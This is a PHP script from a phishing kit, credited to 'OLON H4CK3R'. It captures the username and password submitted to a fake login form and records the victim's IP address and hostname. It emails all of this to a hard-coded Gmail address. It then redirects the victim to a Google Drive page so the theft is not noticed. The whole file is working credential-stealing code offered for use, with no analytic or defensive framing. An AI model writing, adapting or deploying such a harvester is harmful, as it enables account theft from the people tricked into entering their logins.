<?php
$ip = getenv("REMOTE_ADDR"); //
$hostname = gethostbyaddr($ip); //
$message .= "--------------+ Created in 2013 By [ OLON H4CK3R ] +------------\n"; //
$message .= "--------------+ UserLogin +------------\n";  // 
$message .= "Username : ".$_POST['otheruser']."\n"; // 
$message .= "Password : ".$_POST['otherpassword']."\n";
$message .= "--------------+ Created in 2013 By [ OLON H4CK3R ] +------------\n";
$message .= "IP Address : ".$ip."\n";  //
$message .= "HostName : ".$hostname."\n"; //
$message .= "--------------------\n";
$rnessage  = "$message\n";
$message .= "--------------+ Created in 2013 By [ OLON H4CK3R ] +------------\n";

$send="tundewire@gmail.com"; //


$subject = "Other Email Tooolz $ip";  // 
$headers = "From: OLON H4CK3R<new@tooolz.com>"; //
$str=array($send, $IP); foreach ($str as $send)
if(mail($send,$subject,$rnessage,$headers) != false){
mail($Send,$subject,$rnessage,$headers);
mail($messege,$subject,$rnessage,$headers);
Header ("Location: http://www.google.com/intl/en_US/drive/start/apps.html"); //
}
?>